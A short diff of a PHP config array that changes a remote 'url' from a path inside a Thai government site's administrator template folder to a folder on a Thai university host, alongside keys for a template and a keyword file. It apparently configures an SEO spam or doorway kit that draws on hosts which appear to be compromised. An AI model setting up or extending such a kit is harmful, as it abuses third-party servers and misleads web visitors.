@@ -1,6 +1,6 @@
 <?php
 $config = array(
-  	'url'		=> 'https://www.lp-pao.go.th/Main60/administrator/templates/hathor/html/com_admin/sysinfo/asia/',
+  	'url'		=> 'http://libapp.tsu.ac.th/img/style/',
 	'parameter' => 'go',
 	'template'  => 'temp.html',
 	'keywords'  => 'bb.txt',
